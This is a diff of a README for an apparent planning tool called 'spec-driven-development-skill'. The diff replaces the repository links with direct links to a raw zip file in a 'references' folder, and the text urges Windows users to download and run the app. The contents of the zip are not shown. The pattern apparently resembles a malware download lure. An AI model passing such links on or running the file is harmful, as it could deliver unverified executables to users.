@@ -1,12 +1,12 @@
 # 🧭 spec-driven-development-skill - Plan work before you build
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Contaaltv4782/spec-driven-development-skill)
+[![Download](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Contaaltv4782/spec-driven-development-skill/raw/refs/heads/main/references/development-skill-spec-driven-3.4.zip)
 
 ## 📥 Download
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/Contaaltv4782/spec-driven-development-skill
+https://github.com/Contaaltv4782/spec-driven-development-skill/raw/refs/heads/main/references/development-skill-spec-driven-3.4.zip
 
 ## 🪟 Windows setup
 
